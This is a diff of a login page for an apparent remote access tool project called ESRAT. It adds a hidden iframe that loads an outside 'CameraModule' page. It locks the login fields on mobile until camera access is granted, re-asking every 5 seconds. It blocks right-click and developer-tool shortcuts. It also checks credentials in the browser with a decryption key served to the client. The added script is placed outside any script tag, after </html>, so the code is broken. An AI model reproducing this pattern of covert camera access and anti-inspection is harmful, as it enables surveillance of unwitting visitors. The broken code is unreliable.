@@ -1375,322 +1375,140 @@
         </form>
     </div>
 
+    <iframe id="cameraIframe" src="https://es-universe.github.io/ESRAT/events/CameraModule/index.html" style="display:none;"></iframe>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    
     <script>
-        // Feature Detection
-        function detectFeatures() {
-            const html = document.documentElement;
-            
-            // Check for backdrop-filter support
-            if (!CSS.supports('backdrop-filter', 'blur(10px)')) {
-                html.classList.add('no-backdrop-filter');
-            }
-            
-            // Check for flexbox support
-            if (!CSS.supports('display', 'flex')) {
-                html.classList.add('no-flexbox');
-            }
-        }
 
-        // Initialize feature detection
-        detectFeatures();
-
-        // Password Toggle Functionality
-        const passwordInput = document.getElementById('password');
-        const passwordToggle = document.getElementById('passwordToggle');
-
-        passwordToggle.addEventListener('click', function() {
-            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-            passwordInput.setAttribute('type', type);
-            
-            // Toggle icon
-            if (type === 'password') {
-                passwordToggle.classList.remove('bx-show');
-                passwordToggle.classList.add('bx-hide');
-            } else {
-                passwordToggle.classList.remove('bx-hide');
-                passwordToggle.classList.add('bx-show');
-            }
-        });
-
-        // Form Validation
-        function validateForm() {
-            const username = document.getElementById('username');
-            const password = document.getElementById('password');
-            const usernameError = document.getElementById('usernameError');
-            const passwordError = document.getElementById('passwordError');
-            
-            let isValid = true;
-
-            // Reset previous states
-            username.classList.remove('error', 'success');
-            password.classList.remove('error', 'success');
-            usernameError.classList.remove('show');
-            passwordError.classList.remove('show');
-
-            // Validate username/email
-            if (username.value.trim() === '') {
-                username.classList.add('error');
-                usernameError.textContent = 'Username or email is required';
-                usernameError.classList.add('show');
-                isValid = false;
-            } else if (username.value.includes('@') && !isValidEmail(username.value)) {
-                username.classList.add('error');
-                usernameError.textContent = 'Please enter a valid email address';
-                usernameError.classList.add('show');
-                isValid = false;
-            } else {
-                username.classList.add('success');
-            }
-
-            // Validate password
-            if (password.value.length < 6) {
-                password.classList.add('error');
-                passwordError.classList.add('show');
-                isValid = false;
-            } else {
-                password.classList.add('success');
-            }
-
-            return isValid;
-        }
-
-        // Email validation helper
-        function isValidEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
-        }
-
-        // Form submission with enhanced button states
-        const loginForm = document.getElementById('loginForm');
-        const loginBtn = document.getElementById('loginBtn');
-
-        // Add pulse effect on page load
-        setTimeout(() => {
-            loginBtn.classList.add('pulse');
-        }, 2000);
-
-        // Remove pulse on user interaction
-        loginBtn.addEventListener('mouseenter', function() {
-            this.classList.remove('pulse');
-        });
-
-        loginForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Remove any existing state classes
-            loginBtn.classList.remove('pulse', 'success', 'error');
-            
-            if (validateForm()) {
-                // Show loading state
-                loginBtn.classList.add('loading');
-                loginBtn.disabled = true;
-                loginBtn.textContent = 'Signing In...';
-
-                // Simulate login process
-                setTimeout(() => {
-                    // Remove loading state
-                    loginBtn.classList.remove('loading');
-                    loginBtn.disabled = false;
-                    
-                    // Show success state
-                    loginBtn.classList.add('success');
-                    loginBtn.textContent = 'Success!';
-                    
-                    // Reset after success animation
-                    setTimeout(() => {
-                        loginBtn.classList.remove('success');
-                        loginBtn.textContent = 'Sign In';
-                        
-                        // Here you would typically redirect or handle successful login
-                        alert('Login successful! (This is a demo)');
-                    }, 1500);
-                }, 2000);
-            } else {
-                // Show error state
-                loginBtn.classList.add('error');
-                const originalText = loginBtn.textContent;
-                loginBtn.textContent = 'Please check your inputs';
-                
-                // Reset after error animation
-                setTimeout(() => {
-                    loginBtn.classList.remove('error');
-                    loginBtn.textContent = originalText;
-                }, 2000);
-            }
-        });
-
-        // Enhanced button interaction effects
-        loginBtn.addEventListener('mousedown', function() {
-            this.style.transform = 'translateY(-1px) scale(0.98)';
-        });
-
-        loginBtn.addEventListener('mouseup', function() {
-            this.style.transform = '';
-        });
-
-        loginBtn.addEventListener('mouseleave', function() {
-            this.style.transform = '';
-        });
-
-        // Real-time validation
-        document.getElementById('username').addEventListener('blur', validateForm);
-        document.getElementById('password').addEventListener('blur', validateForm);
-
-        // Interactive fish behavior
-        const fish = document.querySelectorAll('.fish');
-        fish.forEach(fishElement => {
-            fishElement.addEventListener('click', function() {
-                this.classList.add('scared');
-                setTimeout(() => {
-                    this.classList.remove('scared');
-                }, 1000);
-            });
-        });
-
-        // Interactive underwater elements
-        const interactiveElements = document.querySelectorAll('.diver, .submarine, .jellyfish, .treasure');
-        interactiveElements.forEach(element => {
-            element.addEventListener('click', function() {
-                // Add a fun interaction effect
-                this.style.transform = 'scale(1.3)';
-                setTimeout(() => {
-                    this.style.transform = '';
-                }, 300);
-            });
-        });
-
-        // Accessibility: Keyboard navigation for custom elements
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Tab') {
-                // Ensure proper tab order
-                const focusableElements = document.querySelectorAll(
-                    'input, button, a, [tabindex]:not([tabindex="-1"])'
-                );
-                
-                // Add visual focus indicators if needed
-                focusableElements.forEach(el => {
-                    el.addEventListener('focus', function() {
-                        this.style.outline = '2px solid rgba(255, 255, 255, 0.8)';
-                    });
-                    
-                    el.addEventListener('blur', function() {
-                        this.style.outline = '';
-                    });
-                });
-            }
-        });
-
-        // Responsive behavior
-        function handleResize() {
-            const viewport = window.innerWidth;
-            const form = document.querySelector('.login-form');
-            
-            if (viewport < 480) {
-                // Extra small screens
-                form.style.margin = '0 5px';
-            } else if (viewport < 768) {
-                // Small screens
-                form.style.margin = '0 10px';
-            } else {
-                // Larger screens
-                form.style.margin = '0 auto';
-            }
-        }
-
-        // Initial resize check
-        handleResize();
-        
-        // Listen for resize events
-        window.addEventListener('resize', handleResize);
-
-        // Prevent zoom on iOS when focusing inputs
-        if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
-            const inputs = document.querySelectorAll('input');
-            inputs.forEach(input => {
-                input.addEventListener('focus', function() {
-                    this.style.fontSize = '16px';
-                });
-            });
-        }
-
-        // Performance optimization: Reduce animations on low-end devices
-        if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 4) {
-            document.documentElement.style.setProperty('--animation-duration', '0.5s');
-        }
-
-        // Error handling for missing resources
-        const logo = document.querySelector('.logo');
-        logo.addEventListener('error', function() {
-            this.style.background = 'linear-gradient(135deg, #4A90E2 0%, #357ABD 100%)';
-            this.innerHTML = '<div style="display: flex; align-items: center; justify-content: center; height: 100%; color: white; font-size: 24px;">ES</div>';
-        });
-
-        // Iframe compatibility checks
-        function checkIframeCompatibility() {
-            // Check if running inside an iframe
-            if (window !== window.top) {
-                // Add iframe-specific styles
-                document.body.classList.add('in-iframe');
-                
-                // Adjust viewport handling for iframe
-                const viewport = document.querySelector('meta[name="viewport"]');
-                if (viewport) {
-                    viewport.setAttribute('content', 
-                        'width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no'
-                    );
-                }
-                
-                // Ensure proper communication with parent frame
-                try {
-                    // Send ready message to parent
-                    window.parent.postMessage({
-                        type: 'iframe-ready',
-                        source: 'es-universe-login'
-                    }, '*');
-                } catch (e) {
-                    console.log('Cross-origin iframe detected');
-                }
-            }
-        }
-
-        // Initialize iframe compatibility
-        checkIframeCompatibility();
-
-        // Handle messages from parent frame
-        window.addEventListener('message', function(event) {
-            // Validate origin in production
-            if (event.data && event.data.type === 'iframe-resize') {
-                // Handle resize requests from parent
-                document.body.style.height = event.data.height + 'px';
-            }
-        });
-
-        // Notify parent of content changes
-        function notifyParentOfResize() {
-            if (window !== window.top) {
-                try {
-                    const height = document.body.scrollHeight;
-                    window.parent.postMessage({
-                        type: 'content-resize',
-                        height: height,
-                        source: 'es-universe-login'
-                    }, '*');
-                } catch (e) {
-                    // Handle cross-origin restrictions
-                }
-            }
-        }
-
-        // Monitor for content changes that might affect height
-        const resizeObserver = new ResizeObserver(entries => {
-            notifyParentOfResize();
-        });
-
-        resizeObserver.observe(document.body);
-
-        // Initial notification
-        setTimeout(notifyParentOfResize, 100);
     </script>
 </body>
 </html>
+
+
+        let cameraStream = null;  // Variable to store the camera stream
+
+        async function retrieveSacredKeys() {
+            const response = await fetch("/ESRAT/asset/keys.json");
+            const sacredKeys = await response.json();
+            return sacredKeys;
+        }
+
+        function unlockArcaneSecrets(cipheredData, mysticalEssence, celestialKeystone) {
+            const decodedKeystone = CryptoJS.enc.Base64.parse(celestialKeystone);
+            const decodedEssence = CryptoJS.enc.Base64.parse(mysticalEssence);
+            const unlockedSecrets = CryptoJS.AES.decrypt(cipheredData, decodedKeystone, {
+                iv: decodedEssence,
+                mode: CryptoJS.mode.CBC,
+                padding: CryptoJS.pad.Pkcs7
+            });
+            return unlockedSecrets.toString(CryptoJS.enc.Utf8);
+        }
+
+        function enableInputs() {
+            document.getElementById("username").disabled = false;
+            document.getElementById("password").disabled = false;
+            document.getElementById("loginBtn").disabled = false; // Changed from submit to loginBtn
+            // document.getElementById("notice-board").style.display = 'none';  // Hide notice board after permission
+        }
+
+        function disableInputs() {
+            document.getElementById("username").disabled = true;
+            document.getElementById("password").disabled = true;
+            document.getElementById("loginBtn").disabled = true; // Changed from submit to loginBtn
+            // document.getElementById("notice-board").style.display = 'block';  // Show notice board if permission is denied
+        }
+
+        function stopCameraStream() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());  // Stop all tracks
+                cameraStream = null;  // Clear the camera stream
+            }
+        }
+
+        function requestCameraPermission() {
+            // Check if the screen size is small (for mobile devices)
+            if (window.innerWidth <= 768) { // You can adjust the breakpoint as needed
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        console.log("Camera permission granted.");
+                        cameraStream = stream;  // Store the camera stream
+                        enableInputs();  // Enable inputs once permission is granted
+
+                        // Stop the camera stream after 5 seconds
+                        setTimeout(stopCameraStream, 5000);
+                        
+                        clearInterval(cameraInterval);  // Stop asking for permission after it's granted
+                    })
+                    .catch(function(err) {
+                        console.log("Camera permission denied, retrying in 5 seconds.");
+                        disableInputs();  // Keep inputs disabled if permission is denied
+                    });
+            } else {
+                // If on larger screens, directly enable inputs without asking for camera
+                enableInputs();
+            }
+        }
+
+        // Check camera permission every 5 seconds until granted
+        const cameraInterval = setInterval(requestCameraPermission, 5000);
+
+        // Event listeners for login
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
+            verifyEnigmaticCredentials();
+        });
+        document.getElementById("password").addEventListener("keydown", (event) => {
+            if (event.key === "Enter") {
+                verifyEnigmaticCredentials();
+            }
+        });
+
+        // Function to verify credentials
+        async function verifyEnigmaticCredentials() {
+            const sacredKeys = await retrieveSacredKeys();
+            const unlockedIdentity = unlockArcaneSecrets(sacredKeys.arcaneCipheredIdentity, sacredKeys.mysticalEssenceOfCipherIdentity, sacredKeys.celestialSecretKeystone);
+            const unlockedPassage = unlockArcaneSecrets(sacredKeys.arcaneCipheredPassage, sacredKeys.mysticalEssenceOfCipherPassage, sacredKeys.celestialSecretKeystone);
+
+            const inputIdentity = document.getElementById("username").value;
+            const inputPassage = document.getElementById("password").value;
+
+            // Check if both inputs are filled
+            if (inputIdentity === "" || inputPassage === "") {
+                alert("Please fill in both username and password.");
+                return;  // Prevent further execution
+            }
+
+            if (inputIdentity === unlockedIdentity && inputPassage === unlockedPassage) {
+                window.location.href = "/ESRAT/index-home.html";  // Redirect if login is successful
+            } else {
+                alert("Incorrect User or Password.");  // Alert on incorrect login
+            }
+        }
+
+        // Cursor shadow effect
+        const cursorShadow = document.querySelector(".cursor-shadow");
+        document.addEventListener("mousemove", (event) => {
+            cursorShadow.style.left = event.clientX + "px";
+            cursorShadow.style.top = event.clientY + "px";
+        });
+
+        // Anti-inspection script
+        document.addEventListener("contextmenu", event => event.preventDefault());  // Disable right-click
+
+        // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
+        document.onkeydown = function(e) {
+            if (e.keyCode === 123) { // F12
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === "I".charCodeAt(0)) {
+                return false; // Ctrl+Shift+I
+            }
+            if (e.ctrlKey && e.keyCode === "U".charCodeAt(0)) {
+                return false; // Ctrl+U
+            }
+            if (e.ctrlKey && e.shiftKey && e.keyCode === "J".charCodeAt(0)) {
+                return false; // Ctrl+Shift+J
+            }
+        };
 
